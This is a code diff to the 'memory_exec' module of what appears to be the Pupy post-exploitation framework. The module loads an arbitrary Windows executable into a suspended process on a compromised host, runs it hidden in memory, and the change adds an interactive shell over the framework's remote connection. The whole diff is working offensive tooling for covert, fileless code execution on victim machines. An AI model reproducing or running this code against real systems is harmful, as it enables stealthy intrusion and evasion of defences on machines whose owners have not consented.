@@ -17,6 +17,7 @@ from pupylib.PupyModule import *
 from pupylib.PupyCompleter import *
 from pupylib.utils.pe import get_pe_arch
 from pupylib.PupyErrors import PupyModuleError
+from pupylib.utils.rpyc_utils import redirected_stdio
 
 __class_name__="MemoryExec"
 
@@ -31,7 +32,7 @@ class MemoryExec(PupyModule):
 		self.arg_parser = PupyArgumentParser(prog="memory_exec", description=self.__doc__)
 		self.arg_parser.add_argument('-p', '--process', default='cmd.exe', help='process to start suspended')
 		self.arg_parser.add_argument('--fork', action='store_true', help='fork and do not wait for the child program. stdout will not be retrieved', completer=path_completer)
-		self.arg_parser.add_argument('--interactive', action='store_true', help='interactive with the new process stdin/stdout')
+		#self.arg_parser.add_argument('-i', '--interactive', action='store_true', help='interactive with the new process stdin/stdout')
 		self.arg_parser.add_argument('path', help='path to the exe', completer=path_completer)
 		self.arg_parser.add_argument('args', nargs='*', help='optional arguments to pass to the exe')
 
@@ -47,10 +48,6 @@ class MemoryExec(PupyModule):
 			self.log(res)
 
 	def run(self, args):
-		if args.interactive:
-			#TODO
-			self.error("interactive memory execution has not been implemented yet")
-			return
 		
 		#check we are injecting from the good process arch:
 		pe_arch=get_pe_arch(args.path)
@@ -59,25 +56,27 @@ class MemoryExec(PupyModule):
 			self.error("%s is a %s PE and your pupy payload is a %s process. Please inject a %s PE or first migrate into a %s process"%(args.path, pe_arch, proc_arch, proc_arch, pe_arch))
 			return
 
-		
 		wait=True
 		redirect_stdio=True
 		if args.fork:
 			wait=False
 			redirect_stdio=False
+
 		raw_pe=b""
 		with open(args.path,'rb') as f:
 			raw_pe=f.read()
+
 		self.client.load_package("pupymemexec")
 		self.client.load_package("pupwinutils.memexec")
+
 		res=""
 		self.mp=self.client.conn.modules['pupwinutils.memexec'].MemoryPE(raw_pe, args=args.args, hidden=True, redirect_stdio=redirect_stdio)
 		self.mp.run()
-		while True:
-			if self.mp.wait(1):
-				break
+		if not args.fork:
+			with redirected_stdio(self.client.conn):
+				self.mp.get_shell()
 		self.mp.close()
-		res=self.mp.get_stdout()
-		self.log(res)
+		#res=self.mp.get_stdout()
+		#self.log(res)
 
 
